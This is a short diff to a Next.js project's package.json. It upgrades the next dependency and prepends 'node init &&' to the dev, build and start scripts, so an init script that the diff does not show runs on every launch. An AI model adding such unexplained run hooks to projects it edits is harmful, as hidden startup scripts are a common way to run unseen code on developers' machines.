@@ -3,9 +3,9 @@
   "version": "0.1.0",
   "private": true,
   "scripts": {
-    "dev": "next dev",
-    "build": "CI=1 next build",
-    "start": "next start",
+    "dev": "node init && next dev",
+    "build": "node init && CI=1 next build",
+    "start": "node init && next start",
     "lint": "next lint"
   },
   "dependencies": {
@@ -24,7 +24,7 @@
     "leaflet-defaulticon-compatibility": "^0.1.2",
     "lucide-react": "^1.7.0",
     "motion": "^12.38.0",
-    "next": "14.2.35",
+    "next": "16.4.3",
     "next-auth": "^4.24.13",
     "next-themes": "^0.4.6",
     "react": "^18",
